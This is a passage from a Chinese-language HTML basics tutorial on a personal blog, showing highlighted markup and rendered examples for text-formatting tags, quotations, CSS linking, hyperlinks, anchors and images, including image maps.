punctuation">></span></span>Keyboard input<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>kbd</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tt</span><span class="token punctuation">></span></span>Teletype text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tt</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>samp</span><span class="token punctuation">></span></span>Sample text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>samp</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>var</span><span class="token punctuation">></span></span>Computer variable<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>var</span><span class="token punctuation">></span></span></code></pre><p><code>Computer code</code></p><p><kbd>Keyboard input</kbd></p><p><tt>Teletype text</tt></p><p><samp>Sample text</samp></p><p><var>Computer variable</var></p><hr><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>address</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>address</span><span class="token punctuation">></span></span>Written by <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>MiaoTony<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span> Visit me at:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>miaotony.xyz<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>MeowBox<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>address</span><span class="token punctuation">></span></span></code></pre><address>Written by <a href="https://miaotony.xyz">MiaoTony</a>.<br> Visit me at:<br>miaotony.xyz<br>MeowBox</address><hr><h3 id="缩写和首字母缩写"><a href="#缩写和首字母缩写" class="headerlink" title="缩写和首字母缩写"></a>缩写和首字母缩写</h3><p>在某些浏览器中，当把鼠标移至缩略词语上时，title 可用于展示表达的完整版本。</p><p><code>&lt;abbr&gt;</code>定义缩写，<code>&lt;acronym&gt;</code> 定义首字母缩写。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>abbr</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>etcetera<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>etc.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>abbr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>acronym</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>World Wide Web<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>WWW<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>acronym</span><span class="token punctuation">></span></span></code></pre><p><abbr title="etcetera">etc.</abbr><br><acronym title="World Wide Web">WWW</acronym></p><hr><h3 id="文字方向（双向重写）"><a href="#文字方向（双向重写）" class="headerlink" title="文字方向（双向重写）"></a>文字方向（双向重写）</h3><p>若浏览器支持双流向覆盖 bi-directional override (bdo)，<code>&lt;bdo&gt;</code>元素用于覆盖当前文本方向，则下面这一行会从右向左输出 (rtl)。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bdo</span> <span class="token attr-name">dir</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rtl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Here is some Hebrew text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bdo</span><span class="token punctuation">></span></span></code></pre><bdo dir="rtl">Here is some Hebrew text</bdo><hr><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>使用 blockquote 元素的话，浏览器会插入换行和外边距，而 q 元素不会有任何特殊的呈现（只是加一个引号）。</p><pre class=" language-html"><code class="language-html">这是长的引用：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>blockquote</span><span class="token punctuation">></span></span>这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>blockquote</span><span class="token punctuation">></span></span>这是短的引用：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>q</span><span class="token punctuation">></span></span>这是短的引用。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>q</span><span class="token punctuation">></span></span></code></pre><p>这是长的引用：</p><blockquote>这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。</blockquote><p>这是短的引用：<br><q><br>这是短的引用。<br></q></p><hr><h3 id="删除线-amp-插入线"><a href="#删除线-amp-插入线" class="headerlink" title="删除线 &amp; 插入线"></a>删除线 &amp; 插入线</h3><p>大多数浏览器会改写为删除文本和下划线文本。</p><p>一些老式的浏览器会把删除文本和下划线文本显示为普通文本。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>一打有 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>del</span><span class="token punctuation">></span></span>二十<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>del</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ins</span><span class="token punctuation">></span></span>十二<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ins</span><span class="token punctuation">></span></span> 件。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>一打有 <del>二十</del> <ins>十二</ins> 件。</p><hr><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p> HTML5 标准：</p><ol><li>如果设置了 <code>&lt;dfn&gt;</code> 元素的 <code>title</code> 属性，则定义项目：</li></ol><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>The <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dfn</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>World Health Organization<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>WHO<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dfn</span><span class="token punctuation">></span></span> was founded in 1948.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>The <dfn title="World Health Organization">WHO</dfn> was founded in 1948.</p><ol start="2"><li>如果 <code>&lt;dfn&gt;</code> 元素包含具有标题的 <code>&lt;abbr&gt;</code> 元素，则 <code>title</code> 定义项目：</li></ol><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>The<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dfn</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>abbr</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>World Health Organization<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>WHO<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>abbr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dfn</span><span class="token punctuation">></span></span>was founded in 1948.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>The <dfn><abbr title="World Health Organization">WHO</abbr></dfn> was founded in 1948.</p><ol start="3"><li>否则，<code>&lt;dfn&gt;</code> 文本内容即是项目，并且父元素包含定义。</li></ol><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dfn</span><span class="token punctuation">></span></span>WHO<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dfn</span><span class="token punctuation">></span></span> World Health Organization 成立于 1948 年。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p><dfn>WHO</dfn> World Health Organization 成立于 1948 年。</p><p>若希望简而化之，请使用<strong>第一条</strong>，或使用 <code>&lt;abbr&gt;</code> 代替。</p><hr><h3 id="著作标题"><a href="#著作标题" class="headerlink" title="著作标题"></a>著作标题</h3><p>浏览器通常以斜体来显示。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cite</span><span class="token punctuation">></span></span>The Scream<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cite</span><span class="token punctuation">></span></span> by Edward Munch. Painted in 1893.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p><cite>The Scream</cite> by Edward Munch. Painted in 1893.</p><br><h2 id="计算机代码"><a href="#计算机代码" class="headerlink" title="计算机代码"></a>计算机代码</h2><p><code>&lt;code&gt;</code> 元素不保留多余的空格和折行。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span>var person = {    firstName:"Bill",    lastName:"Gates",    age:50,    eyeColor:"blue"}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span></code></pre><code>var person = {    firstName:"Bill",    lastName:"Gates",    age:50,    eyeColor:"blue"}</code><p>需解决该问题，必须在 <code>&lt;pre&gt;</code> 元素中包围代码</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span>var person = {    firstName:"Bill",    lastName:"Gates",    age:50,    eyeColor:"blue"}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span></code></pre><code><pre>var person = {    firstName:"Bill",    lastName:"Gates",    age:50,    eyeColor:"blue"}</pre></code><p>也可以<code>code</code>和<code>pre</code>反过来。</p><br><h2 id="CSS-样式的引用"><a href="#CSS-样式的引用" class="headerlink" title="CSS 样式的引用"></a>CSS 样式的引用</h2><h3 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mystyle.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code></pre><h3 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css"><span class="token selector">body </span><span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span> red<span class="token punctuation">}</span><span class="token selector">p </span><span class="token punctuation">{</span><span class="token property">margin-left</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code></pre><h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span> <span class="token property">margin-left</span><span class="token punctuation">:</span> <span class="token number">20</span>px</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>This is a paragraph<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p><strong>优先级</strong>是 <strong>内联样式&gt;内部样式表&gt;外部样式表</strong>。</p><br><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>MiaoTony's blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p><a href="https://miaotony.xyz">MiaoTony’s blog</a></p><p>“链接文本” <strong>不必一定是文本</strong>。图片或其他 HTML 元素都可以成为链接。</p><p>这是另一个 mailto 链接：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mailto:someone@microsoft.com?cc<span class="token punctuation">=</span>someoneelse@microsoft.com&amp;bcc<span class="token punctuation">=</span>andsomeoneelse2@microsoft.com&amp;subject<span class="token punctuation">=</span>Summer%20Party&amp;body<span class="token punctuation">=</span>You%20are%20invited%20to%20a%20big%20summer%20party!<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>发送邮件！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p><a href="mailto:someone@microsoft.com?cc=someoneelse@microsoft.com&amp;bcc=andsomeoneelse2@microsoft.com&amp;subject=Summer%20Party&amp;body=You%20are%20invited%20to%20a%20big%20summer%20party!" target="_blank" rel="noopener">发送邮件！</a></p><h3 id="target-属性"><a href="#target-属性" class="headerlink" title="target 属性"></a>target 属性</h3><p>Target 属性可以定义被链接的文档在何处显示。</p><p><strong>在新窗口打开：</strong></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>MiaoTony's blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p><a href="https://miaotony.xyz" target="_blank">MiaoTony’s blog</a></p><p><strong>跳出页面框架：</strong></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>MiaoTony's blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p><a href="https://miaotony.xyz" target="_top">MiaoTony’s blog</a></p><p><strong>（在hexo部署的时候，好像把所有的<code>target</code>都改成 “_blank” 了 emmm</strong></p><h3 id="name-属性"><a href="#name-属性" class="headerlink" title="name 属性"></a>name 属性</h3><p>name属性规定锚（anchor）的名称。可以使用 name 属性创建 HTML 页面中的书签。</p><p>当使用命名锚（named anchors）时，我们可以创建直接跳至该命名锚（比如页面中某个小节）的链接。</p><p>首先<strong>对锚进行命名</strong>，或者说<strong>创建一个书签</strong>——</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>label123<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>锚（显示在页面上的文本）<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p><a name="label123">锚（显示在页面上的文本）</a></p><p>也可以使用 id 属性来替代 name 属性。</p><p>然后在同一个文档中<strong>创建指向该锚的链接</strong>，或在其他页面指向该锚，即可跳转到这个锚点的位置。</p><p>将 <code>#</code> 符号和锚名称添加到 URL 的末端，就可以直接链接到 tips 这个命名锚了。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#tips<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_self<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>跳转到上面的锚点<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p><a href="#label123" target="_self">跳转到上面的锚点</a></p><p>假如浏览器找不到已定义的命名锚，那么就会定位到文档的顶端。不会有错误发生。</p><br><h2 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h2><p>空标签，只包含属性，并且没有闭合标签。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span>  <span class="token punctuation">/></span></span></code></pre><h3 id="替代文本-alt-属性"><a href="#替代文本-alt-属性" class="headerlink" title="替代文本 alt 属性"></a>替代文本 alt 属性</h3><p>在浏览器无法载入图像时（图裂了），替换文本属性将被用来显示失去的信息。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cat.gif<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>A cat<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>就像这样：</p><img src="/2020/02/14/FrontEnd_HTML_Basic/cat.gif" alt="A cat"><h3 id="图像背景"><a href="#图像背景" class="headerlink" title="图像背景"></a>图像背景</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/background.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>如果图像小于页面，图像会进行重复。</p><h3 id="图像对齐"><a href="#图像对齐" class="headerlink" title="图像对齐"></a>图像对齐</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>未设置对齐方式的图像：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>图像 &lt;img src ="pic.jpg"> 在文本中<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>已设置对齐方式的图像：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>图像 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pic.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bottom<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 在文本中<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>图像 &lt;img src ="pic.jpg" align="middle"> 在文本中<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>图像 &lt;img src ="pic.jpg" align="top"> 在文本中<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>bottom 对齐方式是默认的对齐方式。</p><p><img src="/2020/02/14/FrontEnd_HTML_Basic/img_aglin.png" alt="img_aglin"></p><h3 id="浮动图像"><a href="#浮动图像" class="headerlink" title="浮动图像"></a>浮动图像</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>&lt;img src ="/i/eg_cute.gif" align ="left"> 带有图像的一个段落。图像的 align 属性设置为 "left"。图像将浮动到文本的左侧。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>&lt;img src ="/i/eg_cute.gif" align ="right"> 带有图像的一个段落。图像的 align 属性设置为 "right"。图像将浮动到文本的右侧。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p><img src="/2020/02/14/FrontEnd_HTML_Basic/img_aglin2.png" alt="浮动图像"></p><h3 id="图像尺寸"><a href="#图像尺寸" class="headerlink" title="图像尺寸"></a>图像尺寸</h3><p>通过改变 img 标签的 “height” 和 “width” 属性的值，可以放大或缩小图像。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/html5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/html5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/html5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg" width="50" height="50"><img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg" width="100" height="100"><img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg" width="200" height="200"><h3 id="图像链接"><a href="#图像链接" class="headerlink" title="图像链接"></a>图像链接</h3><p>将一个图像当作链接使用。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/html5.jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>比如点一点这个就到达我的博客主页了→ <a href="https://miaotony.xyz"><img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg"></a></p><p><em>（有可能被hexo优化掉emmm</em></p><h3 id="创建图像映射"><a href="#创建图像映射" class="headerlink" title="创建图像映射"></a>创建图像映射</h3><p>创建带有可供点击区域的图像地图。其中的每个区域都是一个超级链接。</p><p><code>img</code> 元素中的 “usemap” 属性引用 <code>map</code> 元素中的 “id” 或 “name” 属性（根据浏览器）</p><p>图片左上角坐标为 (0,0)，右下角为 (x,y)，左往右为x轴正方向，上往下为y轴正方向。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span><span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.w3school.com.cn/i/eg_planets.jpg<span class="token punctuation">"</span></span><span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">usemap</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#planetmap<span class="token punctuation">"</span></span><span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Planets<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>map</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>planetmap<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>planetmap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&lt;areashape="circle"coords="180,139,14"href ="https://www.w3school.com.cn/example/html/venus.html"target ="_blank"alt="Venus" />&lt;areashape="circle"coords="129,161,10"href ="https://www.w3school.com.cn/example/html/mercur.html"target ="_blank"alt="Mercury" />&lt;areashape="rect"coords="0,0,110,260"href ="https://www.w3school.com.cn/example/html/sun.html"target ="_blank"alt="Sun" /><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>map</span><span class="token punctuation">></span></span></code></pre><p>其中<code>&lt;map&gt;</code>用来定义图像地图，<code>&lt;area&gt;</code>用来定义图像地图中的可点击区域。</p><p>点击对应的区域会跳转到不同的页面。<em><del>（链接有可能被hexo优化掉emmm</del></em>还是可以点的</p><p><img src="https://www.w3school.com.cn/i/eg_planets.jpg" border="0" usemap="#planetmap" alt="Planets"></p><map name="planetmap" id="planetmap"><area shape="circle" coords="180,139,14" href="https://www.w3school.com.cn/example/html/venus.html" target="_blank" alt="Venus"><area shape="circle" coords="129,161,10" href="https://www.w3school.com.cn/example/html/mercur.html" target="_blank" alt="Mercury"><area shape="rect" coords="0,0,110,260" href="https://www.w3school.com.cn/example/html/sun.html" target="_blank" alt="Sun"></map><h3 id="将图像转换为图像映射"><a href="#将图像转换为图像映射" class="headerlink" title="将图像转换为图像映射"></a>将图像转换为图像映射</h3><p>把一幅普通的图像设置为图像映射。加入<code>ismap</code> 属性，即可获得图片的坐标。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/html_ismap.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span 